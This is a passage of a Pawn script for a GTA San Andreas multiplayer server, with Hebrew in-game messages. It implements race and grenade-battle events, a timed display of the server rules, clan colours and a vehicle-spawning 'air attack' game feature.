        else if(-12 < XX < -8){ CreateExplosion(XX-30, 2508.6316, 18.0, 11, 5); CreateExplosion(XX-30, 2497.1504, 18.0, 11, 5); }
        else if(-22 < XX < -18){ CreateExplosion(XX-30, 2508.6316, 18.0, 11, 5); CreateExplosion(XX-30, 2497.1504, 18.0, 11, 5); }
        else if(-32 < XX < -28){ CreateExplosion(XX-30, 2508.6316, 18.0, 11, 5); CreateExplosion(XX-30, 2497.1504, 18.0, 11, 5); }
        else if(-42 < XX < -38){ CreateExplosion(XX-30, 2508.6316, 18.0, 11, 5); CreateExplosion(XX-30, 2497.1504, 18.0, 11, 5); }
        else if(-52 < XX < -48){ CreateExplosion(XX-30, 2508.6316, 18.0, 11, 5); CreateExplosion(XX-30, 2497.1504, 18.0, 11, 5); }
        else if(-62 < XX < -58){ CreateExplosion(XX-30, 2508.6316, 18.0, 11, 5); CreateExplosion(XX-30, 2497.1504, 18.0, 11, 5); }
        else if(-72 < XX < -68){ CreateExplosion(XX-30, 2508.6316, 18.0, 11, 5); CreateExplosion(XX-30, 2497.1504, 18.0, 11, 5); }
        else if(-82 < XX < -78){ CreateExplosion(XX-30, 2508.6316, 18.0, 11, 5); CreateExplosion(XX-30, 2497.1504, 18.0, 11, 5); }
}






//==
stock ClanError(playerid,level){
if(level == 2)return SendClientMessage(playerid, red,".פקודה זאתי לסגני לידרים בלבד");
if(level == 3)return SendClientMessage(playerid, red,".פקודה זאתי ללידרים ראשיים בלבד");
SendClientMessage(playerid, WHITE,".אין לך גישה לפקודה זאתי");
return 1;
}


stock ReturnPlayerID(PlayerName[]) {
        for(new i = 0; i < GetMaxPlayers(); i++) if(IsPlayerConnected(i)) { new name[24]; GetPlayerName(i,name,24); if(strfind(name,PlayerName,true)!=-1) return i; }
        return INVALID_PLAYER_ID;
}
//stock IsNumeric(string[]) { for (new i = 0, j = strlen(string); i < j; i++) if (string[i] > '9' || string[i] < '0') return 0; return 1; }

forward ClanColor();
public ClanColor()
{
fnm
if(InCounterStrike[i] > 0) return 0;
if(!IsPlayerXAdmin(i,1)) return 0;
if(strcmp(dini_Get(GetPlayerFile(i),"Clan"),"None.",true))
{
format(file,256,"Clans/%s.ini",dini_Get(GetPlayerFile(i),"Clan"));


if(dini_Int(file,"Color1") > 0)
{
SetPlayerColor(i,sgba2hex(dini_Int(file,"Color1"),dini_Int(file,"Color2"),dini_Int(file,"Color3"),77));//צבע במפה
}
}
}

return 1;
}


//------------------------------------------------------------------------------
forward CityRaceingStart();
public CityRaceingStart()
{
new string[256];
SendClientMessageToAll(0xFFFFFFAA,"»»»~ | מערכת המירוצים - מירוץ ערים מיוחד | »»»~");
SendClientMessageToAll(0x00FFFFAA, "! נפתחה הרשמה לקרב מירוצים, סוג מירוץ ערים: ערים הזדרזו להירשם");
format(string,sizeof(string),".$3000 :המנצח יזכה בפרס כספי של");
SendClientMessageToAll(0x00FFFFAA,string);
SendClientMessageToAll(0x16EB43FF, "/CityRace :יש לכם 60 שניות להצטרף");
SendClientMessageToAll(0xFFFFFFAA,"»»»~ | מערכת המירוצים - מירוץ ערים מיוחד | »»»~");
//CityRaceingWinner = 1;
CityRaceingPlayers = 0;
 CountCityRaceingr = 60; CountCityRaceingrdown();
return 1;
}


forward CountCityRaceingrdown();
public CountCityRaceingrdown()
{

if (CountCityRaceingr > 0)
{
new String[256];
format(String, 256,"~w~%d",CountCityRaceingr);
GameTextForAll(String,1000,6);
--CountCityRaceingr;
return SetTimer("CountCityRaceingrdown", 1000, 0);
}

if (CountCityRaceingr < 1)
{
for (new i=0; i<200; i++)
{
if (InCityRaceing[i] == 1 || InCityRaceing2[i] == 1)
{
TogglePlayerControllable(i, true);
CityRaceingOn = 5;
GameTextForPlayer(i,"~g~GO!",1000,6);
}
}
}

return 1;
}

forward RemovePlayerFromRaces(playerid);
public RemovePlayerFromRaces(playerid)
{
if(InCityRaceing[playerid] > 0)
{
InCityRaceing[playerid] = 0;
CityCP[playerid] = 0;
CityRaceingPlayers --;
DisablePlayerRaceCheckpoint(playerid);
SetPlayerVirtualWorld(playerid,0);
TogglePlayerControllable(playerid,1);
if(IsPlayerInAnyVehicle(playerid))
{
SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),0);
}
}
//LOS SANTOS
if(InCityRaceing2[playerid] > 0)
{
InCityRaceing2[playerid] = 0;
CityCP[playerid] = 0;
CityRaceingPlayers --;
DisablePlayerRaceCheckpoint(playerid);
SetPlayerVirtualWorld(playerid,0);
TogglePlayerControllable(playerid,1);
if(IsPlayerInAnyVehicle(playerid))
{
SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),0);
}
}
}

//-=-=-=-=-=-=-=-


//==================================GreStart====================================
forward GreStart2();
public GreStart2() {
new string[256];

SendClientMessageToAll(WHITE,"[_____________גאטר - רימונים_____________]");
SendClientMessageToAll(0xF6F658FF, "! נפתחה הרשמה לקרב מאורגן, הזדרזו להירשם");
format(string,sizeof(string),".$10,000 :פרס למנצח מתחיל מסכום של");
SendClientMessageToAll(0xF6F658FF,string);
SendClientMessageToAll(0x0F6A0FF, "/Gre :יש לכם 60 שניות להצטרף, להצטרפות רשמו");
SendClientMessageToAll(WHITE,".---------------------------------");

GreOn = 1; GrePlayers = 0;
CountGrellenge = 60; CountGrellengedown(); CountGrellengeFuc = 1;
GreSECX = SetTimer("GreSECX",1000, 1);
return 1; }
//==================================CountGrellengedown===================================
forward CountGrellengedown();
public CountGrellengedown()
{
if(CountGrellenge == 30)
{
SendClientMessageToAll(COLOR_WHITE, "More 30 sec start the Gre Weapon to join do: /Gre");
}
else if(CountGrellenge == 15)
{
SendClientMessageToAll(COLOR_WHITE, "More 15 sec start the Gre Weapon to join do: /Gre");
}
new String[256];
format(String, 256,"~w~%d",CountGrellenge);
GameTextForAll(String,1000,6);
if(CountGrellenge > 0) {
--CountGrellenge;
SetTimer("CountGrellengedown", 1000, 0);
} else {
if(CountGrellengeFuc == 1) {
TeleportPlayerToGre();
if(GreKnoob == 1) {
CountGrellenge = 10; CountGrellengedown(); CountGrellengeFuc = 2;
} }
if(CountGrellengeFuc == 2 && CountGrellenge <= 0) {
UFALLGre();
} } }
//==================================UFALLGre====================================
forward UFALLGre();
public UFALLGre() {
for(new i = 0;i<MAX_PLAYERS;i++) {
if(PGrein[i] == 1) {
TogglePlayerControllable(i, 1);
SetCameraBehindPlayer(i);
} } }
//=============================TeleportPlayerToGre==============================
forward TeleportPlayerToGre();
public TeleportPlayerToGre() {
if(GrePlayers < MinGrePlayers)
{
GreEnd(0);
return 1;
}
for(new i = 0;i<MAX_PLAYERS;i++)
{
if(InGre[i] == 1)
{
ResetPlayerWeapons(i);
new rand = random(sizeof(GreSpawn));
SetPlayerPos(i, GreSpawn[rand][0], GreSpawn[rand][1], GreSpawn[rand][2]);
ResetPlayerWeapons(i);
ResetPlayerWeapons(i);
SetPlayerArmour(i, 100.0);
SetPlayerHealth(i, 100.0);
GivePlayerWeapon(i,16,10000);
GreStart = 1; PGrein[i] = 1; GreKnoob = 1;
TogglePlayerControllable(i, 0);
GreTIME = SetTimer("Greck",1000, 1);
} }
return 1; }

forward GreEnd(status);
public GreEnd(status)
{
if(status == 0) {
SendClientMessageToAll(red, ".המלחמת רימונים בוטלה, סיבה: חוסר משתתפים");
GreOn = 0; GrePlayers = 0;
KillTimer(GreTIME);
KillTimer(GreSECX);
for(new i = 0;i<MAX_PLAYERS;i++) {
InGre[i] = 0;  PGrein[i] = 0; GreStart = 0; GreKnoob = 0;
} return 1; }
else if(status == 1) {
GreOn = 0; GrePlayers = 0;
LACY_GiveMoney(GreWinner, GrePras);
GetPlayerName(GreWinner, playername, sizeof(playername));
KillTimer(GreTIME);
KillTimer(GreSECX);
ResetPlayerWeapons(GreWinner);
SetPlayerInterior(GreWinner, 0);
new rand = random(sizeof(gRandomPlayerSpawns));
SetPlayerPos(GreWinner, gRandomPlayerSpawns[rand][0], gRandomPlayerSpawns[rand][1], gRandomPlayerSpawns[rand][2]); // Warp the player

SendClientMessageToAll(WHITE,"[________ גאטר רימונים - מנצח ________]");
SendClientMessageToAll(0xE21E1EFF, "!הקרב הסתיים");
format(kboobGre, sizeof(kboobGre), "$%d :נישאר אחרון וקיבל פרס %s", GrePras, playername);
SendClientMessageToAll(0xE21E1EFF, kboobGre);
SendClientMessageToAll(WHITE,".-------------------------------------");


format(kboobGre, sizeof(kboobGre), "$%d אתה ניצחת במלחמת רימונים, קיבלת", GrePras);
SendClientMessage(GreWinner, lblue, kboobGre);
for(new i = 0;i<MAX_PLAYERS;i++) {
InGre[i] = 0; GreStart = 0; PGrein[i] = 0; GreKnoob = 0;
} return 1; }
else if(status == 2) {
format(kboobGre, sizeof(kboobGre), ".ביטל את המלחמת רימונים \"%s\" האדמין ", Greadminsname);
SendClientMessageToAll(lblue, kboobGre);
GrePlayers = 0;
GreKnoob = 0; GreStart = 0;
GreOn = 0;
CountGrellenge = 0; CountGrellengeFuc = 0;
KillTimer(GreTIME);
KillTimer(GreSECX);
for(new i = 0;i<MAX_PLAYERS;i++) {
InGre[i] = 0; PGrein[i] = 0;
} return 1; }
return 1; }

//===================================Greck======================================
forward Greck();
public Greck() {
if(GreStart == 1) {
if(GrePlayers == 1) {
for(new i = 0;i<MAX_PLAYERS;i++) {
if(InGre[i] == 1) {
GreWinner = i; GreEnd(1);
} } } } return 1; }





forward RemovePlayerFromRaces2(playerid);
public RemovePlayerFromRaces2(playerid)
{
if(InAllMapRaceing[playerid] > 0)
{
InAllMapRaceing[playerid] = 0;
AllMapCP[playerid] = 0;
AllMapRaceingPlayers --;
DisablePlayerRaceCheckpoint(playerid);
SetPlayerVirtualWorld(playerid,1);
TogglePlayerControllable(playerid,1);
if(IsPlayerInAnyVehicle(playerid))
{
SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),1);
}
}
}

forward AllMapRaceingStart();
public AllMapRaceingStart()
{
new string[256];
SendClientMessageToAll(0xFFFFFFAA,"~~~~~~~ | Special AllMap Race System | ~~~~~~~");
SendClientMessageToAll(0x00FFFFAA, "! נפתחה הרשמה לקרב מירוצים, סוג מירוץ יבשה: ערים הזדרזו להירשם");
format(string,sizeof(string),".$3000 :המנצח יזכה בפרס כספי של");
SendClientMessageToAll(0x00FFFFAA,string);
SendClientMessageToAll(0x16EB43FF, "/JR :יש לכם 60 שניות להצטרף, להצטרפות רשמו");
SendClientMessageToAll(0xFFFFFFAA,"~~~~~~~ | מערכת המירוצים - מירוץ יבשה מיוחד | ~~~~~~~");
//AllMapRaceingWinner = 1;
AllMapRaceingPlayers = 0;
 CountAllMapRaceingr = 60; CountAllMapRaceingrdown();
return 1;
}


forward CountAllMapRaceingrdown();
public CountAllMapRaceingrdown()
{
for(new i = 0; i < MAX_PLAYERS; i++) if (IsPlayerConnected(i) && InAllMapRaceing[i])
if (CountAllMapRaceingr > 0)
{
new String[256];
format(String, 256,"~w~%d",CountAllMapRaceingr);
GameTextForAll(String,1000,6);
--CountAllMapRaceingr;
return SetTimer("CountAllMapRaceingrdown", 1000, 0);
}
for (new i=0; i<200; i++) if (IsPlayerConnected(i) && InAllMapRaceing[i]) TogglePlayerControllable(i, true);
AllMapRaceingOn = 0;
return GameTextForAll("~g~GO!",1000,6);
}

forward Rule1(playerid);
forward Rule2(playerid);
forward Rule3(playerid);
forward Rule4(playerid);
forward Rule5(playerid);
forward Rule6(playerid);
forward Rule7(playerid);
forward Rule8(playerid);
forward endrules(playerid);

public Rule1(playerid)
{
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
	SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    





	SendClientMessage(playerid, 0xFF99AADD, "(1) .אין לעשות סואפ קיל/ספון קיל בשום פנים ואופן");
    SendClientMessage(playerid, 0xFF99AADD, ".סואפ קיל: לעשות 'הריגה, הריגה' על מנת ליצור לכם סטאטס יותר גבוה");
    SendClientMessage(playerid, 0xFF99AADD, ".ספואן קיל: להרוג עם מסוק / רכב / מטוס את חברי השרת | ספואן קיל: אין להרוג במקומות התחלתיות");
    SendClientMessage(playerid, WHITE, ".עונש סואפ קיל: איפוס סטאטסים");
    SendClientMessage(playerid, WHITE, ".עונש ספון קיל: איפוס סטאטסים | כלא | קיק | באן לפי מידת הצורך");
	timers_rule[playerid][1] = SetTimerEx("Rule2", 8*1000, 0, "i", playerid);

	return 0;
}

public Rule2(playerid)
{
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    



    
    SendClientMessage(playerid, 0xFF99AADD, "(2) .אין להשתמש בציטים בשום פנים ואופן");
    SendClientMessage(playerid, WHITE, ".עונש: באן שלא ניתן לערעור");
	timers_rule[playerid][2] = SetTimerEx("Rule3", 6*1000, 0, "i", playerid);
	return 0;
}

public Rule3(playerid)
{



    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid, 0xFF99AADD, "(3) .אין בשום פנים ואופן להשתמש במודים אשר נחשבים כהאקים");
    SendClientMessage(playerid, WHITE, ".עונש: באן שלא ניתן לערעור");
	timers_rule[playerid][3] = SetTimerEx("Rule4", 6*1000, 0, "i", playerid);
	return 0;
}

public Rule4(playerid)
{



    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
	SendClientMessage(playerid, 0xFF99AADD, "(4) .יש להתנהג בכבוד לאדמין, לחברי השרת, ולכל מי שנמצא בשרתנו ובפורום");
    SendClientMessage(playerid, WHITE, ".עונש: באן | קיק | מיוט לפי מידת הצורך");
    timers_rule[playerid][4] = SetTimerEx("Rule5",  6*1000, 0, "i", playerid);
	return 0;
}

public Rule5(playerid)
{


    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid, 0xFF99AADD, "(5) .כשאדמין מדבר איתך ושואל אותך שאלה תענה אמת בלבד אל תשקר");
    SendClientMessage(playerid, WHITE, ".עונש: באן | קיק, לפי מידת הצורך");
	timers_rule[playerid][5] = SetTimerEx("Rule6",  6*1000, 0, "i", playerid);
	return 0;
}

public Rule6(playerid)
{

    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid, 0xFF99AADD, "(6) .אין לרמות את המערכת בשום דרך ואין לנסות לעקוף אותה");
    SendClientMessage(playerid, WHITE, ".עונש: איפוס סטאטסטים במקרה הצורך, או קיק");
	timers_rule[playerid][6] = SetTimerEx("Rule7",  6*1000, 0, "i", playerid);
	return 0;
}

public Rule7(playerid)
{


    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
	SendClientMessage(playerid, 0xFF99AADD, "(7) .אין לפרסם שרתים מתחרים/אתרים בצ'אט, או בהודעה פרטית, או בגאנג צ'אט");
    SendClientMessage(playerid, WHITE, ".עונש: באן של יורד ולא ניתן לערעור");
	timers_rule[playerid][7] = SetTimerEx("Rule8",  6*1000, 0, "i", playerid);
	return 0;
}

public Rule8(playerid)
{

    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid, 0xFF99AADD, "(8) .אין להציף את הצ'אט בסימינים כמו: '!!!!!' '??????' סימן אחד מספיק");
    SendClientMessage(playerid, WHITE, ".עונש: מיוט");
	timers_rule[playerid][8] = SetTimerEx("endrules", 8*1000, 0, "i", playerid);
	return 0;
}

public endrules(playerid)
{
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
    SendClientMessage(playerid,WHITE,"  ");
SendClientMessage(playerid, WHITE, ":הקראת החוקים נגמרה בהצלחה - כעת בחר/י אחת מאפשריות");
SendClientMessage(playerid, 0xFF99AADD, "/Yes :אם את/ה רוצה להתחבר לפי כתובת האייפי שלך הקש/י");
SendClientMessage(playerid, 0xFF99AADD, "/No :הקש/י '/Login' אם את/ה רוצה להתחבר ע'י הפקודה");
PlayerInfo[playerid][Logged] = 4;
    OnPlayerRequestClass(playerid,0);
    for(new timer = 0; timer < 14; timer++)
    {
    KillTimer(timers_rule[playerid][timer]);
    }
	return 0;
}
forward QDMZ(playerid);
public QDMZ(playerid)
{
ResetPlayerWeapons(playerid);
InDM[playerid] = 0;
WeaponDM[playerid] = 0;
return 1;
}

//PLAYER TO POINT

public resetshekel(playerid) return shekel[playerid] = 1;

public AirAttackStart(playerid)
{

if(Stateaa[playerid] == 1)
{

if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][0] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][1] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][2] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][3] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 2;
return true;
}


else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][0] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][1] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][2] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][3] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][4] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][5] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 2;
return true;
}

else if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][0] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][1] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][2] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][3] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][4] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][5] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][6] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][7] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1]-200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][8] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1]-200.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][9] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-200.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][10] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-200.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][11] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-200.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);

SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 2;
return true;
}

return true;
}
else if(Stateaa[playerid] == 2)
{

if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][4] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-180.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][5] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-180.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][6] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-180.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][7] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-180.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 3;
return true;
}

else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][6] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-180.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][7] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-180.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][8] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-180.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][9] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-180.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][10] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-180.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][11] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-180.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 3;
return true;
}

else if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][11] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-180.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][12] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-180.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][13] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-180.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][14] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-180.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][15] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-180.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][16] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-180.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][17] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-180.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][18] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1]-180.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][19] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1]-180.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][20] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-180.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][21] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-180.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][22] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-180.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);

SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 3;
return true;
}

return true;
}

else if(Stateaa[playerid] == 3)
{

if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][8] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][9] =  CreateVehicle(520, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][10] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][11] =  CreateVehicle(520, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 4;
return true;
}

else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][12] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][13] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][14] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][15] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][16] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][17] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
